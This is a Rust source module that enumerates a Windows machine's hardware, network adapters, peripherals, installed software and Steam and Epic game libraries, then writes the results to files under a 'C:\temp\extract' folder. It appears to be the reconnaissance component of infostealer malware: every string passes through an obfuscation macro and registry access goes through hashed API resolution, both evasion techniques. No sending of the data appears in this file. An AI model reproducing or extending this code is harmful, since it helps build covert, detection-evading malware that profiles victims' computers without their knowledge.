use crate::sprotect;
use crate::api_resolve::HashedAPIs;
use std::fs;
use std::process::Command;
use sysinfo::{System, Disks, Networks};
use wmi::{COMLibrary, WMIConnection, Variant};
use std::collections::HashMap;
use winapi::um::winreg::{HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER};
use winapi::um::winnt::{KEY_READ, REG_SZ};
use std::ptr;
use std::ffi::OsString;
use std::os::windows::ffi::{OsStringExt, OsStrExt};
use serde::{Deserialize, Serialize};

#[derive(Debug, Serialize, Deserialize)]
pub struct SystemSpecs {
    pub cpu_info: CpuInfo,
    pub memory_info: MemoryInfo,
    pub gpu_info: Vec<GpuInfo>,
    pub storage_info: Vec<StorageInfo>,
    pub network_info: Vec<NetworkInfo>,
    pub motherboard_info: MotherboardInfo,
    pub peripherals_info: PeripheralsInfo,
    pub installed_apps: Vec<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct CpuInfo {
    pub name: String,
    pub cores: u32,
    pub threads: u32,
    pub max_speed: u32,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct MemoryInfo {
    pub total_gb: u64,
    pub stick_count: usize,
    pub sticks: Vec<MemoryStick>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct MemoryStick {
    pub capacity_gb: u64,
    pub speed: u32,
    pub memory_type: String,
    pub manufacturer: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct GpuInfo {
    pub name: String,
    pub vram_gb: u64,
    pub driver_version: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct StorageInfo {
    pub drive: String,
    pub total_gb: u64,
    pub available_gb: u64,
    pub file_system: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct NetworkInfo {
    pub name: String,
    pub speed_mbps: u64,
    pub adapter_type: String,
    pub manufacturer: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct MotherboardInfo {
    pub manufacturer: String,
    pub model: String,
    pub version: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct PeripheralsInfo {
    pub usb_devices: Vec<String>,
    pub audio_devices: Vec<String>,
    pub input_devices: Vec<String>,
}

pub async fn collect() -> Result<(), Box<dyn std::error::Error>> {
    let output_dir = sprotect!("C:\\temp\\extract\\SystemInfo");
    fs::create_dir_all(&output_dir)?;
    
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
    }

    collect_ram_info(&output_dir).await?;
    collect_network_info(&output_dir).await?;
    collect_peripherals_info(&output_dir).await?;
    collect_hardware_info(&output_dir).await?;
    collect_installed_apps(&output_dir).await?;

    Ok(())
}

async fn collect_ram_info(output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let mut ram_info = Vec::new();
    
    let com_con = COMLibrary::new()?;
    let wmi_con = WMIConnection::new(com_con.into())?;

    let results: Vec<HashMap<String, Variant>> = wmi_con.raw_query(sprotect!("SELECT * FROM Win32_PhysicalMemory"))?;
    
    let mut total_capacity = 0u64;
    let stick_count = results.len();
    
    ram_info.push(format!("{}{}", sprotect!("Memory Information:"), ""));
    ram_info.push(format!("{}{}", sprotect!("Total Memory Sticks: "), stick_count));
    
    for (index, result) in results.iter().enumerate() {
        if let Some(capacity) = result.get(&sprotect!("Capacity").to_string()) {
            if let Variant::UI8(cap) = capacity {
                let cap_gb = *cap / 1024 / 1024 / 1024;
                total_capacity += *cap;
                ram_info.push(format!("{}{}{}{}{}", sprotect!("Stick "), index + 1, sprotect!(": "), cap_gb, sprotect!(" GB")));
            }
        }
        
        if let Some(speed) = result.get(&sprotect!("Speed").to_string()) {
            if let Variant::UI4(spd) = speed {
                ram_info.push(format!("{}{}{}{}{}", sprotect!("  Speed "), index + 1, sprotect!(": "), spd, sprotect!(" MHz")));
            }
        }
        
        if let Some(memory_type) = result.get(&sprotect!("MemoryType").to_string()) {
            if let Variant::UI2(mem_type) = memory_type {
                let type_str = match mem_type {
                    24 => sprotect!("DDR3"),
                    26 => sprotect!("DDR4"),
                    30 => sprotect!("DDR5"),
                    _ => sprotect!("Unknown"),
                };
                ram_info.push(format!("{}{}: {}", sprotect!("  Type "), index + 1, type_str));
            }
        }
        
        if let Some(manufacturer) = result.get(&sprotect!("Manufacturer").to_string()) {
            if let Variant::String(mfg) = manufacturer {
                ram_info.push(format!("{}{}: {}", sprotect!("  Manufacturer "), index + 1, mfg));
            }
        }
    }
    
    let total_gb = total_capacity / 1024 / 1024 / 1024;
    ram_info.insert(1, format!("{}{}{}", sprotect!("Total Memory: "), total_gb, sprotect!(" GB")));
    
    let output_path = format!("{}\\{}", output_dir, sprotect!("ram.txt"));
    fs::write(output_path, ram_info.join("\n"))?;
    
    Ok(())
}

async fn collect_network_info(output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let mut network_info = Vec::new();
    
    network_info.push(format!("{}", sprotect!("Network Adapters:")));
    
    let com_con = COMLibrary::new()?;
    let wmi_con = WMIConnection::new(com_con.into())?;
    
    let results: Vec<HashMap<String, Variant>> = wmi_con.raw_query(sprotect!("SELECT * FROM Win32_NetworkAdapter WHERE NetConnectionStatus = 2"))?;
    
    for result in results {
        if let Some(name) = result.get(&sprotect!("Name").to_string()) {
            if let Variant::String(adapter_name) = name {
                network_info.push(format!("{}{}", sprotect!("Adapter: "), adapter_name));
                
                if let Some(speed) = result.get(&sprotect!("Speed").to_string()) {
                    if let Variant::UI8(spd) = speed {
                        let speed_mbps = *spd / 1_000_000;
                        network_info.push(format!("{}{}{}", sprotect!("  Max Speed: "), speed_mbps, sprotect!(" Mbps")));
                    }
                }
                
                if let Some(adapter_type) = result.get(&sprotect!("AdapterType").to_string()) {
                    if let Variant::String(atype) = adapter_type {
                        network_info.push(format!("{}{}", sprotect!("  Type: "), atype));
                    }
                }
                
                if let Some(manufacturer) = result.get(&sprotect!("Manufacturer").to_string()) {
                    if let Variant::String(mfg) = manufacturer {
                        network_info.push(format!("{}{}", sprotect!("  Manufacturer: "), mfg));
                    }
                }
                
                network_info.push(format!("{}", ""));
            }
        }
    }
    
    let output_path = format!("{}\\{}", output_dir, sprotect!("network.txt"));
    fs::write(output_path, network_info.join("\n"))?;
    
    Ok(())
}

async fn collect_peripherals_info(output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let mut peripherals_info = Vec::new();
    
    peripherals_info.push(format!("{}", sprotect!("Connected Peripherals:")));
    
    let com_con = COMLibrary::new()?;
    let wmi_con = WMIConnection::new(com_con.into())?;
    
    let usb_results: Vec<HashMap<String, Variant>> = wmi_con.raw_query(sprotect!("SELECT * FROM Win32_USBHub"))?;
    let pnp_results: Vec<HashMap<String, Variant>> = wmi_con.raw_query(sprotect!("SELECT * FROM Win32_PnPEntity WHERE Service IS NOT NULL"))?;
    
    peripherals_info.push(format!("{}", sprotect!("USB Devices:")));
    for result in usb_results {
        if let Some(name) = result.get(&sprotect!("Name").to_string()) {
            if let Variant::String(device_name) = name {
                peripherals_info.push(format!("  {}", device_name));
            }
        }
    }
    
    peripherals_info.push(format!("{}", ""));
    peripherals_info.push(format!("{}", sprotect!("Audio Devices:")));
    
    let audio_results: Vec<HashMap<String, Variant>> = wmi_con.raw_query(sprotect!("SELECT * FROM Win32_SoundDevice"))?;
    for result in audio_results {
        if let Some(name) = result.get(&sprotect!("Name").to_string()) {
            if let Variant::String(device_name) = name {
                peripherals_info.push(format!("  {}", device_name));
            }
        }
    }
    
    peripherals_info.push(format!("{}", ""));
    peripherals_info.push(format!("{}", sprotect!("Input Devices:")));
    
    let mouse_results: Vec<HashMap<String, Variant>> = wmi_con.raw_query(sprotect!("SELECT * FROM Win32_PointingDevice"))?;
    for result in mouse_results {
        if let Some(name) = result.get(&sprotect!("Name").to_string()) {
            if let Variant::String(device_name) = name {
                peripherals_info.push(format!("{}{}", sprotect!("  Mouse: "), device_name));
            }
        }
    }
    
    let keyboard_results: Vec<HashMap<String, Variant>> = wmi_con.raw_query(sprotect!("SELECT * FROM Win32_Keyboard"))?;
    for result in keyboard_results {
        if let Some(name) = result.get(&sprotect!("Name").to_string()) {
            if let Variant::String(device_name) = name {
                peripherals_info.push(format!("{}{}", sprotect!("  Keyboard: "), device_name));
            }
        }
    }
    
    let output_path = format!("{}\\{}", output_dir, sprotect!("peripherals.txt"));
    fs::write(output_path, peripherals_info.join("\n"))?;
    
    Ok(())
}

async fn collect_hardware_info(output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let mut hardware_info = Vec::new();
    let disks = Disks::new_with_refreshed_list();
    
    hardware_info.push(format!("{}", sprotect!("Hardware Information:")));
    
    let com_con = COMLibrary::new()?;
    let wmi_con = WMIConnection::new(com_con.into())?;
    
    hardware_info.push(format!("{}", sprotect!("CPU Information:")));
    let cpu_results: Vec<HashMap<String, Variant>> = wmi_con.raw_query(sprotect!("SELECT * FROM Win32_Processor"))?;
    for result in cpu_results {
        if let Some(name) = result.get(&sprotect!("Name").to_string()) {
            if let Variant::String(cpu_name) = name {
                hardware_info.push(format!("{}{}", sprotect!("  Name: "), cpu_name));
            }
        }
        
        if let Some(cores) = result.get(&sprotect!("NumberOfCores").to_string()) {
            if let Variant::UI4(core_count) = cores {
                hardware_info.push(format!("{}{}", sprotect!("  Cores: "), core_count));
            }
        }
        
        if let Some(threads) = result.get(&sprotect!("NumberOfLogicalProcessors").to_string()) {
            if let Variant::UI4(thread_count) = threads {
                hardware_info.push(format!("{}{}", sprotect!("  Threads: "), thread_count));
            }
        }
        
        if let Some(max_speed) = result.get(&sprotect!("MaxClockSpeed").to_string()) {
            if let Variant::UI4(speed) = max_speed {
                hardware_info.push(format!("{}{}{}", sprotect!("  Max Speed: "), speed, sprotect!(" MHz")));
            }
        }
    }
    
    hardware_info.push(format!("{}", ""));
    hardware_info.push(format!("{}", sprotect!("GPU Information:")));
    let gpu_results: Vec<HashMap<String, Variant>> = wmi_con.raw_query(sprotect!("SELECT * FROM Win32_VideoController"))?;
    for result in gpu_results {
        if let Some(name) = result.get(&sprotect!("Name").to_string()) {
            if let Variant::String(gpu_name) = name {
                hardware_info.push(format!("{}{}", sprotect!("  GPU: "), gpu_name));
            }
        }
        
        if let Some(vram) = result.get(&sprotect!("AdapterRAM").to_string()) {
            if let Variant::UI4(vram_bytes) = vram {
                let vram_gb = *vram_bytes as u64 / 1024 / 1024 / 1024;
                hardware_info.push(format!("{}{}{}", sprotect!("  VRAM: "), vram_gb, sprotect!(" GB")));
            }
        }
        
        if let Some(driver_version) = result.get(&sprotect!("DriverVersion").to_string()) {
            if let Variant::String(version) = driver_version {
                hardware_info.push(format!("{}{}", sprotect!("  Driver: "), version));
            }
        }
    }
    
    hardware_info.push(format!("{}", ""));
    hardware_info.push(format!("{}", sprotect!("Motherboard Information:")));
    let mb_results: Vec<HashMap<String, Variant>> = wmi_con.raw_query(sprotect!("SELECT * FROM Win32_BaseBoard"))?;
    for result in mb_results {
        if let Some(manufacturer) = result.get(&sprotect!("Manufacturer").to_string()) {
            if let Variant::String(mfg) = manufacturer {
                hardware_info.push(format!("{}{}", sprotect!("  Manufacturer: "), mfg));
            }
        }
        
        if let Some(product) = result.get(&sprotect!("Product").to_string()) {
            if let Variant::String(prod) = product {
                hardware_info.push(format!("{}{}", sprotect!("  Model: "), prod));
            }
        }
        
        if let Some(version) = result.get(&sprotect!("Version").to_string()) {
            if let Variant::String(ver) = version {
                hardware_info.push(format!("{}{}", sprotect!("  Version: "), ver));
            }
        }
    }
    
    hardware_info.push(format!("{}", ""));
    hardware_info.push(format!("{}", sprotect!("Storage Information:")));
    for disk in &disks {
        let disk_name = disk.name().to_string_lossy();
        let total_space = disk.total_space() / 1024 / 1024 / 1024;
        let available_space = disk.available_space() / 1024 / 1024 / 1024;
        let file_system = disk.file_system();
        
        hardware_info.push(format!("{}{}", sprotect!("  Drive: "), disk_name));
        hardware_info.push(format!("{}{}{}", sprotect!("    Total: "), total_space, sprotect!(" GB")));
        hardware_info.push(format!("{}{}{}", sprotect!("    Available: "), available_space, sprotect!(" GB")));
        hardware_info.push(format!("{}{}", sprotect!("    File System: "), file_system.to_string_lossy()));
    }
    
    let output_path = format!("{}\\{}", output_dir, sprotect!("hardware.txt"));
    fs::write(output_path, hardware_info.join("\n"))?;
    
    Ok(())
}

async fn collect_installed_apps(output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let mut apps_info = Vec::new();
    
    apps_info.push(format!("{}", sprotect!("Comprehensive Installed Applications:")));
    apps_info.push(format!("{}", ""));
    
    let registry_apps = collect_registry_apps_native().await?;
    if !registry_apps.is_empty() {
        apps_info.push(format!("{}", sprotect!("Registry Applications:")));
        apps_info.extend(registry_apps);
        apps_info.push(format!("{}", ""));
    }
    
    let steam_games = collect_steam_games_native().await?;
    if !steam_games.is_empty() {
        apps_info.push(format!("{}", sprotect!("Steam Games:")));
        apps_info.extend(steam_games);
        apps_info.push(format!("{}", ""));
    }
    
    let epic_games = collect_epic_games_native().await?;
    if !epic_games.is_empty() {
        apps_info.push(format!("{}", sprotect!("Epic Games:")));
        apps_info.extend(epic_games);
        apps_info.push(format!("{}", ""));
    }
    
    let output_path = format!("{}{}{}", output_dir, sprotect!("\\"), sprotect!("installed_apps.txt"));
    fs::write(output_path, apps_info.join("\n"))?;
    
    Ok(())
}

async fn collect_registry_apps_native() -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let mut apps = Vec::new();
    
    let uninstall_paths = [
        sprotect!("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"),
        sprotect!("SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"),
    ];
    
    for path in &uninstall_paths {
        if let Ok(hklm_apps) = enumerate_registry_apps(HKEY_LOCAL_MACHINE, path) {
            apps.extend(hklm_apps);
        }
        if let Ok(hkcu_apps) = enumerate_registry_apps(HKEY_CURRENT_USER, path) {
            apps.extend(hkcu_apps);
        }
    }
    
    Ok(apps)
}

fn enumerate_registry_apps(root_key: winapi::shared::minwindef::HKEY, subkey_path: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let mut apps = Vec::new();
    let mut key: *mut std::ffi::c_void = ptr::null_mut();
    
    let subkey_wide: Vec<u16> = OsString::from(subkey_path).encode_wide().chain(std::iter::once(0)).collect();
    
    unsafe {
        if HashedAPIs::reg_open_key_ex_w(
            root_key as *mut _,
            subkey_wide.as_ptr(),
            0,
            KEY_READ,
            &mut key
        ) == 0 {
            let mut index = 0;
            let mut name_buffer = [0u16; 256];
            let mut name_len = name_buffer.len() as u32;
            
            while HashedAPIs::reg_enum_key_ex_w(
                key,
                index,
                name_buffer.as_mut_ptr(),
                &mut name_len,
                ptr::null_mut(),
                ptr::null_mut(),
                ptr::null_mut(),
                ptr::null_mut()
            ) == 0 {
                let app_name = OsString::from_wide(&name_buffer[..name_len as usize]).to_string_lossy().to_string();
                
                if let Ok(app_info) = get_app_info_from_registry(key, &app_name) {
                    if !app_info.is_empty() {
                        apps.extend(app_info);
                        apps.push(String::new());
                    }
                }
                
                index += 1;
                name_len = name_buffer.len() as u32;
                name_buffer = [0u16; 256];
            }
            
            HashedAPIs::reg_close_key(key);
        }
    }
    
    Ok(apps)
}

fn get_app_info_from_registry(parent_key: *mut std::ffi::c_void, app_key_name: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let mut app_info = Vec::new();
    let mut app_key: *mut std::ffi::c_void = ptr::null_mut();
    
    let app_key_wide: Vec<u16> = OsString::from(app_key_name).encode_wide().chain(std::iter::once(0)).collect();
    
    unsafe {
        if HashedAPIs::reg_open_key_ex_w(
            parent_key,
            app_key_wide.as_ptr(),
            0,
            KEY_READ,
            &mut app_key
        ) == 0 {
            if let Ok(display_name) = read_registry_string(app_key, &sprotect!("DisplayName")) {
                app_info.push(format!("{}{}", sprotect!("App: "), display_name));
                
                if let Ok(version) = read_registry_string(app_key, &sprotect!("DisplayVersion")) {
                    app_info.push(format!("{}{}", sprotect!("  Version: "), version));
                }
                
                if let Ok(publisher) = read_registry_string(app_key, &sprotect!("Publisher")) {
                    app_info.push(format!("{}{}", sprotect!("  Publisher: "), publisher));
                }
                
                if let Ok(location) = read_registry_string(app_key, &sprotect!("InstallLocation")) {
                    app_info.push(format!("{}{}", sprotect!("  Location: "), location));
                }
            }
            
            HashedAPIs::reg_close_key(app_key);
        }
    }
    
    Ok(app_info)
}

fn read_registry_string(key: *mut std::ffi::c_void, value_name: &str) -> Result<String, Box<dyn std::error::Error>> {
    let value_name_wide: Vec<u16> = OsString::from(value_name).encode_wide().chain(std::iter::once(0)).collect();
    let mut buffer = [0u16; 512];
    let mut buffer_size = (buffer.len() * 2) as u32;
    let mut value_type = 0u32;
    
    unsafe {
        if HashedAPIs::reg_query_value_ex_w(
            key,
            value_name_wide.as_ptr(),
            ptr::null_mut(),
            &mut value_type,
            buffer.as_mut_ptr() as *mut u8,
            &mut buffer_size
        ) == 0 && value_type == REG_SZ {
            let len = (buffer_size / 2) as usize;
            if len > 0 && buffer[len - 1] == 0 {
                return Ok(OsString::from_wide(&buffer[..len - 1]).to_string_lossy().to_string());
            }
        }
    }
    
    Err(sprotect!("Failed to read registry value").into())
}

async fn collect_steam_games_native() -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let mut games = Vec::new();
    
    if let Ok(steam_path) = read_registry_string_from_path(HKEY_LOCAL_MACHINE, &sprotect!("SOFTWARE\\WOW6432Node\\Valve\\Steam"), &sprotect!("InstallPath")) {
        let steamapps_path = format!("{}\\{}", steam_path, sprotect!("steamapps"));
        
        if let Ok(entries) = std::fs::read_dir(&steamapps_path) {
            for entry in entries.flatten() {
                let file_name = entry.file_name().to_string_lossy().to_string();
                if file_name.starts_with(&sprotect!("appmanifest_")) && file_name.ends_with(&sprotect!(".acf")) {
                    if let Ok(content) = std::fs::read_to_string(entry.path()) {
                        if let Some(game_name) = extract_steam_game_name(&content) {
                            if let Some(app_id) = extract_steam_app_id(&content) {
                                games.push(format!("{}{} (ID: {})", sprotect!("Steam Game: "), game_name, app_id));
                            }
                        }
                    }
                }
            }
        }
    }
    
    Ok(games)
}

fn read_registry_string_from_path(root_key: winapi::shared::minwindef::HKEY, key_path: &str, value_name: &str) -> Result<String, Box<dyn std::error::Error>> {
    let mut key: *mut std::ffi::c_void = ptr::null_mut();
    let key_path_wide: Vec<u16> = OsString::from(key_path).encode_wide().chain(std::iter::once(0)).collect();
    
    unsafe {
        if HashedAPIs::reg_open_key_ex_w(
            root_key as *mut _,
            key_path_wide.as_ptr(),
            0,
            KEY_READ,
            &mut key
        ) == 0 {
            let result = read_registry_string(key, value_name);
            HashedAPIs::reg_close_key(key);
            return result;
        }
    }
    
    Err(sprotect!("Failed to open registry key").into())
}

fn extract_steam_game_name(content: &str) -> Option<String> {
    for line in content.lines() {
        let line = line.trim();
        if line.starts_with(&sprotect!("\"name\"")) {
            if let Some(start) = line[6..].find("\"") {
                let actual_start = start + 6;
                if let Some(end) = line.rfind("\"") {
                    if end > actual_start {
                        return Some(line[actual_start + 1..end].to_string());
                    }
                }
            }
        }
    }
    None
}

fn extract_steam_app_id(content: &str) -> Option<String> {
    for line in content.lines() {
        let line = line.trim();
        if line.starts_with(&sprotect!("\"appid\"")) {
            if let Some(start) = line[7..].find("\"") {
                let actual_start = start + 7;
                if let Some(end) = line.rfind("\"") {
                    if end > actual_start {
                        return Some(line[actual_start + 1..end].to_string());
                    }
                }
            }
        }
    }
    None
}

async fn collect_epic_games_native() -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let mut games = Vec::new();
    let manifests_path = sprotect!("C:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\Manifests");
    
    if let Ok(entries) = std::fs::read_dir(&manifests_path) {
        for entry in entries.flatten() {
            let file_name = entry.file_name().to_string_lossy().to_string();
            if file_name.ends_with(&sprotect!(".item")) {
                if let Ok(content) = std::fs::read_to_string(entry.path()) {
                    if let Ok(manifest) = serde_json::from_str::<serde_json::Value>(&content) {
                        if let Some(display_name) = manifest.get(&sprotect!("DisplayName")).and_then(|v| v.as_str()) {
                            games.push(format!("{}{}", sprotect!("Epic Game: "), display_name));
                            
                            if let Some(version) = manifest.get(&sprotect!("AppVersion")).and_then(|v| v.as_str()) {
                                games.push(format!("{}{}", sprotect!("  Version: "), version));
                            }
                            
                            if let Some(location) = manifest.get(&sprotect!("InstallLocation")).and_then(|v| v.as_str()) {
                                games.push(format!("{}{}", sprotect!("  Location: "), location));
                            }
                        }
                    }
                }
            }
        }
    }
    
    Ok(games)
}